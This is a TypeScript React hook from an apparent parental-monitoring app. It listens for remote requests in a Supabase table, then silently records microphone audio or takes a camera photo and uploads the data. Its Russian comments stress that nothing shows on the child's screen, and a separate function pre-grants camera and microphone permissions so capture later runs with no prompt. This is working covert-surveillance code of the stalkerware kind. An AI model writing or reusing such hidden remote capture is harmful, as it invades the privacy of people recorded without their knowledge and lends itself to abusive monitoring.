import { useEffect, useRef } from "react";
import { supabase } from "@/integrations/supabase/client";
import { useAuth } from "@/contexts/AuthContext";
import { Capacitor } from "@capacitor/core";
import { Camera } from "@capacitor/camera";

interface MonitoringRequest {
  id: string;
  request_type: "photo" | "audio" | "location";
  status: "pending" | "completed" | "failed";
}

const recordAudio = async (durationMs: number): Promise<Blob | null> => {
  try {
    // Check if MediaDevices API is available
    if (typeof navigator === "undefined" || !navigator.mediaDevices?.getUserMedia) {
      // eslint-disable-next-line no-console
      console.warn("MediaDevices API not available");
      return null;
    }

    let stream: MediaStream | null = null;
    let recorder: MediaRecorder | null = null;

    try {
      stream = await navigator.mediaDevices.getUserMedia({ audio: true });
      const chunks: Blob[] = [];

      recorder = new MediaRecorder(stream);
      recorder.ondataavailable = (e) => {
        try {
          chunks.push(e.data);
        } catch (err) {
          // eslint-disable-next-line no-console
          console.warn("Failed to push audio chunk:", err);
        }
      };

      await new Promise<void>((resolve) => {
        try {
          if (!recorder) return resolve();
          recorder.onstop = () => resolve();
          recorder.start();
        } catch (err) {
          // eslint-disable-next-line no-console
          console.warn("Failed to start recorder:", err);
          resolve();
        }
      });

      await new Promise((resolve) => setTimeout(resolve, durationMs));

      try {
        if (recorder && recorder.state !== "inactive") {
          recorder.stop();
        }
      } catch (err) {
        // eslint-disable-next-line no-console
        console.warn("Failed to stop recorder:", err);
      }

      return chunks.length > 0 ? new Blob(chunks, { type: "audio/webm" }) : null;
    } catch (err) {
      // eslint-disable-next-line no-console
      console.warn("Audio recording failed:", err);
      return null;
    } finally {
      // Clean up stream
      if (stream) {
        try {
          stream.getTracks().forEach((track) => track.stop());
        } catch (err) {
          // eslint-disable-next-line no-console
          console.warn("Failed to stop stream:", err);
        }
      }
    }
  } catch (err) {
    // eslint-disable-next-line no-console
    console.warn("recordAudio outer catch:", err);
    return null;
  }
};

/**
 * Тихий снимок кадра: берём видеопоток камеры, снимаем один кадр в canvas и сразу
 * закрываем поток. На экране ребёнка не появляется ни интерфейс камеры, ни предпросмотр.
 */
const takePhoto = async (facingMode: "user" | "environment" = "user"): Promise<Blob | null> => {
  let stream: MediaStream | null = null;
  try {
    if (typeof navigator === "undefined" || !navigator.mediaDevices?.getUserMedia) {
      // eslint-disable-next-line no-console
      console.warn("Camera stream API not available");
      return null;
    }

    stream = await navigator.mediaDevices.getUserMedia({
      video: { facingMode, width: { ideal: 1280 }, height: { ideal: 720 } },
      audio: false,
    });

    const video = document.createElement("video");
    video.muted = true;
    video.playsInline = true;
    video.srcObject = stream;

    await new Promise<void>((resolve) => {
      const done = () => resolve();
      video.onloadedmetadata = done;
      window.setTimeout(done, 3000);
    });

    try {
      await video.play();
    } catch (e) {
      // eslint-disable-next-line no-console
      console.warn("Silent capture: play failed:", e);
    }

    // Даём сенсору кадр-другой на экспозицию.
    await new Promise((r) => setTimeout(r, 600));

    const width = video.videoWidth || 1280;
    const height = video.videoHeight || 720;
    const canvas = document.createElement("canvas");
    canvas.width = width;
    canvas.height = height;
    const ctx = canvas.getContext("2d");
    if (!ctx) return null;
    ctx.drawImage(video, 0, 0, width, height);

    return await new Promise<Blob | null>((resolve) => {
      canvas.toBlob((b) => resolve(b), "image/jpeg", 0.85);
    });
  } catch (err) {
    // eslint-disable-next-line no-console
    console.warn("Silent photo capture failed:", err);
    return null;
  } finally {
    try {
      stream?.getTracks().forEach((t) => t.stop());
    } catch (e) {
      // eslint-disable-next-line no-console
      console.warn("Failed to stop camera stream:", e);
    }
  }
};

/**
 * Разовый предварительный запрос разрешений камеры/микрофона на устройстве ребёнка,
 * чтобы команды родителя выполнялись потом полностью автоматически.
 */
export const prewarmMonitoringPermissions = async (): Promise<void> => {
  try {
    if (!Capacitor.isNativePlatform()) return;
    try {
      const status = await Camera.checkPermissions();
      if (status.camera !== "granted") {
        await Camera.requestPermissions({ permissions: ["camera"] });
      }
    } catch (e) {
      // eslint-disable-next-line no-console
      console.warn("Camera permission prewarm skipped:", e);
    }

    try {
      if (navigator.mediaDevices?.getUserMedia) {
        const s = await navigator.mediaDevices.getUserMedia({ audio: true });
        s.getTracks().forEach((t) => t.stop());
      }
    } catch (e) {
      // eslint-disable-next-line no-console
      console.warn("Mic permission prewarm skipped:", e);
    }
  } catch (e) {
    // eslint-disable-next-line no-console
    console.warn("prewarmMonitoringPermissions failed:", e);
  }
};

export const useMonitoringListener = (enabled: boolean = true) => {
  const { user } = useAuth();
  const unsubscribeRef = useRef<(() => void) | null>(null);

  useEffect(() => {
    if (!enabled || !user?.id) return;

    let active = true;

    const setupListener = () => {
      try {
        const channel = supabase
          .channel(`monitoring-${user.id}`)
          .on(
            "postgres_changes",
            {
              event: "INSERT",
              schema: "public",
              table: "parent_monitoring_requests",
              filter: `child_id=eq.${user.id}`,
            },
            async (payload) => {
              if (!active) return;

              const req = payload.new as MonitoringRequest;
              if (!req.id) return;

              try {
                let blob: Blob | null = null;
                let dataUrl: string | null = null;

                // Execute monitoring action with full error protection
                if (req.request_type === "audio") {
                  try {
                    blob = await recordAudio(5000);
                    if (blob) {
                      dataUrl = await new Promise<string>((resolve) => {
                        const reader = new FileReader();
                        reader.onload = () => {
                          try {
                            resolve(reader.result as string);
                          } catch (e) {
                            // eslint-disable-next-line no-console
                            console.warn("FileReader failed:", e);
                            resolve("");
                          }
                        };
                        reader.onerror = () => resolve("");
                        reader.readAsDataURL(blob!);
                      });
                    }
                  } catch (err) {
                    // eslint-disable-next-line no-console
                    console.warn("Audio capture failed:", err);
                  }
                } else if (req.request_type === "photo") {
                  try {
                    blob = await takePhoto();
                    if (blob) {
                      dataUrl = await new Promise<string>((resolve) => {
                        const reader = new FileReader();
                        reader.onload = () => {
                          try {
                            resolve(reader.result as string);
                          } catch (e) {
                            // eslint-disable-next-line no-console
                            console.warn("FileReader failed:", e);
                            resolve("");
                          }
                        };
                        reader.onerror = () => resolve("");
                        reader.readAsDataURL(blob!);
                      });
                    }
                  } catch (err) {
                    // eslint-disable-next-line no-console
                    console.warn("Photo capture failed:", err);
                  }
                }

                // Mark as completed/failed regardless of capture success
                try {
                  await supabase
                    .from("parent_monitoring_requests")
                    .update({
                      status: dataUrl ? "completed" : "failed",
                      data_url: dataUrl || null,
                      completed_at: new Date().toISOString(),
                    })
                    .eq("id", req.id);
                } catch (err) {
                  // eslint-disable-next-line no-console
                  console.warn("Failed to update monitoring request status:", err);
                }
              } catch (err) {
                // eslint-disable-next-line no-console
                console.warn("Monitoring request processing failed:", err);
              }
            },
          )
          .subscribe((status) => {
            if (status === "CLOSED") {
              // eslint-disable-next-line no-console
              console.warn("Monitoring subscription closed");
            }
          });

        if (active) {
          unsubscribeRef.current = () => {
            try {
              supabase.removeChannel(channel);
            } catch (e) {
              // eslint-disable-next-line no-console
              console.warn("Failed to remove monitoring channel:", e);
            }
          };
        }
      } catch (err) {
        // eslint-disable-next-line no-console
        console.warn("setupListener failed:", err);
      }
    };

    try {
      setupListener();
    } catch (err) {
      // eslint-disable-next-line no-console
      console.warn("useMonitoringListener setup failed:", err);
    }

    return () => {
      active = false;
      if (unsubscribeRef.current) {
        try {
          unsubscribeRef.current();
        } catch (e) {
          // eslint-disable-next-line no-console
          console.warn("Failed to unsubscribe from monitoring:", e);
        }
      }
    };
  }, [enabled, user?.id]);
};
